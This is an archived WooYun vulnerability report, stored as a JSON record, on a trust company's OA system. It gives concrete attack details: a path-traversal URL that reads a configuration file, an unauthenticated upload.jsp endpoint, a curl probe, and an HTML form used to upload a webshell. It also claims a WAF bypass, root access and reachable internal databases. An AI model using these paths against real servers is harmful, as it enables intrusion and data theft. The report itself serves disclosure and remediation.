{"id": 66749, "wybug_id": "wooyun-2015-0141529", "wybug_title": "中航信托某重要系统存在安全漏洞导致绕过waf Getshell/文件读取/SQL注入等诸多影响（可进入内网数据库）", "wybug_corp": "中航信托", "wybug_author": "路人甲", "wybug_date": "2015-09-18 12:07", "wybug_open_date": "2015-11-04 19:10", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向公众公开  简要描述： 中航信托某重要系统存在安全漏洞导致绕过waf Getshell/文件读取/SQL注入等诸多影响（可进入内网数据库） 详细说明：  通过神器发现了 http://**.**.**.**/ 这个地址（包括几个端口），似乎使用了泛微的OA系统，这个系统存在非常多的安全漏洞，咱们一个一个来试。1，任意文件读取漏洞http://**.**.**.**:7001/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml\n\n2，SQL注射漏洞\n\n\n\n登录的地方可以注射，但是我们不用sql注射，因为有更好利用的漏洞。3，任意文件上传漏洞http://**.**.**.**:8081/tools/SWFUpload/upload.jsp\ncurl -I http://**.**.**.**:8081/tools/SWFUpload/upload.jspHTTP/1.1 500 Internal Server ErrorServer: Resin/3.1.12\n存在这个文件，利用这个表单进行上传利用\n<form method='post' action='http://**.**.**.**:8081/tools/SWFUpload/upload.jsp'  enctype=\"multipart/form-data\" > <input type=\"file\" id=\"file\" name=\"test\" style=\"height:20px;BORDER: #8F908B 1px solid;\"/><button type=submit value=\"getshell\">getshell</button></form>\n但是发现似乎有waf，不过这服务器上这套很low，顶多是个耽误时间的东西。\n\n突破，拿到shell！\n\n\n\n呵呵，直接root权限了，虽然一些命令受到限制，但是写个shell脚本久突破了，这waf，啧啧……\n\n   漏洞证明：  获取到了数据库信息，可以连接\n\n\n\n好多数据表，不读了，证明的差不多了，点到为止。\n\n   修复方案：  上传的webshell已经自觉删除，厂商处理掉这个OA吧，漏洞太多。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-09-20 19:08 厂商回复： CNVD确认并复现所述情况，已由CNVD通过网站管理方公开联系渠道向其邮件通报，由其后续提供解决方案。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}